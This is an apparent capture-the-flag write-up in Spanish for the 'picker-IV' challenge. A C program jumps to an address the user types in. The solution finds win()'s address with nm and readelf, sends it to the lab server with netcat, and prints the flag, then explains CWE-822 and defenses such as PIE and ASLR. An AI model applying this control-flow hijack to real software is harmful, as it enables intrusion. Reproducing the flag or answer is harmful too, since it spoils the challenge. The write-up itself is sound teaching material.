## Descripción
Can you figure out how this program works to get the flag?

## Solución
- Analizamos el código fuente en C proporcionado en `picker-IV.c`:
  ```c
  int win() {
    FILE *fptr;
    char c;

    printf("You won!\n");
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        exit(0);
    }
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    printf("\n");
    fclose(fptr);
  }

  int main() {
    signal(SIGSEGV, print_segf_message);
    setvbuf(stdout, NULL, _IONBF, 0);

    unsigned int val;
    printf("Enter the address in hex to jump to, excluding '0x': ");
    scanf("%x", &val);
    printf("You input 0x%x\n", val);

    void (*foo)(void) = (void (*)())val;
    foo();
  }
  ```
- En `main()`, el programa solicita al usuario una dirección de memoria en hexadecimal (sin prefijo `0x`), la almacena en `val` y salta directamente a ejecutar código en esa dirección convirtiéndola a un puntero a función (`void (*foo)(void) = (void (*)())val; foo();`).
- La función `win()` lee e imprime el contenido de `flag.txt`.
- Para obtener la dirección de memoria exacta de la función `win()`, inspeccionamos la tabla de símbolos del binario ELF compilado `picker-IV` mediante `nm` o `readelf`:
  ```bash
  nm picker-IV | grep win
  # 00000000004012a1 T win
  ```
- O alternativamente con `readelf`:
  ```bash
  readelf -s picker-IV | grep win
  # 34: 00000000004012a1   162 FUNC    GLOBAL DEFAULT   15 win
  ```
- La dirección de `win()` es `0x4012a1`. Dado que el binario no fue compilado como ejecutable de posición independiente (PIE está deshabilitado, la dirección base es fija en `0x400000`), esta dirección es constante tanto en local como en el servidor remoto.
- Nos conectamos a la instancia `chatelaine.cylabacademy.net:38208` y enviamos `4012a1`:
  ```bash
  echo "4012a1" | nc chatelaine.cylabacademy.net 38208
  ```
- Salida obtenida:
  ```text
  Enter the address in hex to jump to, excluding '0x': You input 0x4012a1
  You won!
  academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}
  ```
- Bandera extraída:
```text
academy{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_f0fec8d0}
```

## Notas Adicionales
- Saltar o bifurcar hacia direcciones proporcionadas directamente por el usuario (*jump-to-user-supplied-address*) constituye una vulnerabilidad crítica que permite secuestrar el puntero de instrucción (Instruction Pointer / PC) y redirigir el flujo de ejecución hacia cualquier función arbitraria en la memoria del proceso (CWE-822).
- Para prevenir este tipo de ataques, las aplicaciones modernas habilitan PIE (*Position Independent Executables*) junto con ASLR (*Address Space Layout Randomization*), y utilizan tablas de salto o estructuras de datos controladas en lugar de llamadas directas a punteros arbitrarios.
- Herramientas utilizadas:
  - `nm` / `readelf`: Inspección de símbolos del binario ELF.
  - `nc` (Netcat) / script en Python con `socket`.

## Referencias
- [CWE-822: Untrusted Pointer Dereference](https://cwe.mitre.org/data/definitions/822.html)
- [readelf(1) - Linux man page](https://man7.org/linux/man-pages/man1/readelf.1.html)
